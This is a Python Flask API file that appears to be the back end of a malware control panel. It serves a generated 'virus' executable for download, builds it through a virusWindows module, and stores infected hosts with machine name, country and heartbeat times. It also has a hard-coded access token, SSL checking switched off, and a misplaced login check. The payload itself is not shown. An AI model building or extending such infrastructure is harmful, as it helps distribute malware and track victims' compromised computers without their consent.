import requests
from flask import Blueprint, render_template, request, flash, jsonify, send_file
from flask_login import login_required, current_user
#from .models import Note, ImageSet, Image
from .models import Virus, Hosts
import sqlite3
from . import db
import json
import os
import socketio

import virusWindows as virus

## Ignore temp lack of ssl
os.environ['CURL_CA_BUNDLE'] = ''


api = Blueprint('api', __name__)
userToken = '1234567890'

def dbConnect():
    global conn
    #conn = sqlite3.connect('/var/www/instance/database.db')
    conn = sqlite3.connect('instance/databasen.db')
    global curs
    curs = conn.cursor()

# Does not get used but could reduce repetativeness 
def execute_query(query, params):
    with sqlite3.connect('instance/databasen.db') as conn:
        curs = conn.cursor()
        curs.execute(query, params)
        result = curs.fetchall()
        conn.close()
    return result



#######################
####### APIs ##########
#######################


###### Virus calls #######

@api.route('/download')
def download_exe():
    exe_path = '/var/www/rubberduck/virus/generated_script.exe'  # Update with the actual path to your .exe file
    return send_file(exe_path, as_attachment=True)


@api.route('/update', methods=['POST'])
def update():
    print("Virus update called!")
    data = json.loads(request.data)
    print(data)
    try:
        return jsonify({'message': 'success'})  # Return a valid response
    except Exception as e:
        print(e)
        return jsonify({'message': str(e)})  # Return a v

#####

###### Create virus ######
@login_required
@api.route('/virusmake', methods=['GET', 'POST'])
def virusmake():
    virus.test()
    try:
        virus.generateExe("generated_script.py")
        return jsonify({'message': 'success'})  # Return a valid response
    except Exception as e:
        print(e)
        return jsonify({'message': str(e)})  # Return a valid response with the error message
   



##### SAVE DATA APIS #####
## saves a virus 
@api.route('/savevirus', methods=['POST'])
def saveVirus():
    data = json.loads(request.data)
    print(data)
    user_id = data['user_id']
    token = data['token']
    virus_type = data['virus_type']
    name = data['name']
    heartbeat_rate = data['heartbeat_rate']
    print(virus_type)
    print(user_id)
    print(name)
    print(token)
    if token == userToken :
        try:
            dbConnect()
            curs.execute("INSERT INTO Virus (virus_type, name, heartbeat_rate, user_id) VALUES (?, ?, ?, ?)", (virus_type, name, heartbeat_rate, user_id))
            conn.commit()
            conn.close()
            print("Success")
            flash('Virus Created!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        print("token not valid or duplicate virus")
        flash('Duplicate virus  or wrong access token', category='error')
        return jsonify({'message': 'token not valid or duplicate virus '})


## saves a hosts 
@api.route('/savehost', methods=['POST'])
def saveHost():
    data = json.loads(request.data)
    print(data)
    user_id = data['user_id']
    virus_id = data['virus_id']
    token = data['token']
    pc_name = data['pc_name']
    country = data['country']
    host_notes = data['host_notes']
    settings = data['settings']
    last_heartbeat = data['last_heartbeat']
    if token == userToken :
        try:
            dbConnect()
            curs.execute("INSERT INTO Hosts (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat) VALUES (?, ?, ?, ?, ?, ?, ?)", (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat))
            conn.commit()
            conn.close()
            print("Success")
            flash('Host Created!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        print("token not valid")
        flash('Possible wrong access token', category='error')
        return jsonify({'message': 'token not valid'})



##### GET DATA APIS #####
## Get all virus for the user to display in virus view
# @login_required
@api.route('/getvirus', methods=['GET'])
def getVirus(userId = "1", token = "1234567890"):
    print("getvirus")
    if token == userToken:
        try:
            dbConnect()
            print("Trying to get virus table data")

            curs.execute("SELECT * FROM Virus WHERE user_id = ?", (userId))
            rows = curs.fetchall()

            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.loads(json.dumps(rows))
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})



@api.route('/gethosts', methods=['GET'])
def getHosts(userId = "1", token = "1234567890"):
    print("getHosts")
    if token == userToken:
        try:
            dbConnect()
            print("Trying to get Hosts table data")
            curs.execute("SELECT * FROM Hosts WHERE user_id = ?", (userId))
            rows = curs.fetchall()
            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.loads(json.dumps(rows))
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})



####### DELETE APIS ##########

@api.route('/deletevirus', methods=['DELETE'])
@login_required
def deleteVirus():
    print("deleteVirus called")
    data = request.get_json()
    print("data:")
    print(data)
    id = data['virus_id']
    user_id = data['user_id']
    token = data['token']
    print(id)
    print(token)
    if token == userToken:
        try:
            dbConnect()
            print("Trying to delete Virus")
            curs.execute("DELETE FROM virus WHERE id = ? AND user_id = ?", (id, user_id))
            conn.commit()
            conn.close()
            print("Virus deleted")
            flash('Virus deleted!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})


@api.route('/deletehost', methods=['DELETE'])
@login_required
def deleteHost():
    print("deleteHost called")
    data = request.get_json()
    print("data:")
    print(data)
    id = data['host_id']
    user_id = data['user_id']
    token = data['token']
    print(id)
    print(token)
    if token == userToken:
        try:
            dbConnect()
            print("Trying to delete Host")
            curs.execute("DELETE FROM Hosts WHERE id = ? AND user_id = ?", (id, user_id))
            conn.commit()
            conn.close()
            print("Host deleted")
            flash('Host deleted!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})


########## Testing area ############
## Json examples ##
## Gets used to test APIs with json as data in the calls

exampleUser = {
    "user_id": 1,
    "token": "1234567890",
    "email ": "tester@tester.com",
    "password ": "Test12345",
    "public_key ": "shapublic",
    "private_key ": "shaprivate",
    }

exampleVirus = {
    "user_id": 1,
    "token": "1234567890",
    "virus_type": "Silent",
    "name": "TestVirus1",
    "heartbeat_rate": "1h",
    "user_id": 1
    }

exampleHost= {
    "user_id": 1,
    "token": "1234567890",
    "pc_name": "Silent",
    "country": "TestVirus1",
    "host_notes": "1h",
    "settings": "SomeSetting",
    "last_heartbeat": "10/05/2023;21:45",
    "host_notes": "1h",
    "user_id": 1,
    "virus_id": 1,
    }

exampleDeleteHost= {
    "user_id": 1,
    "token": "1234567890",
    "id":1,
    }

exampleDeleteVirus= {
    "user_id": 1,
    "token": "1234567890",
    "id":1,
    }

## Example Python api call which POST to a remote server api with a json object which uses the exampleJson format in a try catch block
### Get examples ###
@api.route('/apivirussendexample', methods=['GET', 'POST'])
def apiVirusExample():
    try:
        url = "http://127.0.0.1:5000/savevirus"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apiupdate', methods=['GET', 'POST'])
def apiApiExample():
    try:
        url = "http://127.0.0.1:5000/update"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apihostssendexample', methods=['GET', 'POST'])
def apiHostsExample():
    try:
        url = "http://127.0.0.1.93:5000/savehost"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
### Get examples ###
@api.route('/apigetvirusexample', methods=['GET', 'POST'])
def apiGetVirusExample():
    try:
        url = "http://127.0.0.1:5000/getvirus"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
    
@api.route('/apigethostsexample', methods=['GET', 'POST'])
def apiGetHostsExample():
    try:
        url = "http://127.0.0.1:5000/gethosts"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"   

### Delete examples ###
@api.route('/apideletevirusexample', methods=['GET', 'POST'])
def apiDeleteVirusExample():
    print("apiDeleteVirusExample")
    print(current_user.id)
    try:
        url = "http://127.0.0.1:5000/deletevirus"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        response = requests.delete(url, data=json.dumps(exampleDeleteHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
    
@api.route('/apideletehostsexample', methods=['GET', 'POST'])
def apiDeleteHostsExample():
    print("apiDeleteHostsExample")
    try:
        url = "http://127.0.0.1:5000/deletehost"
        headers = {'Content-Type': 'application/json'}
        response = requests.delete(url, data=json.dumps(exampleDeleteHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"   














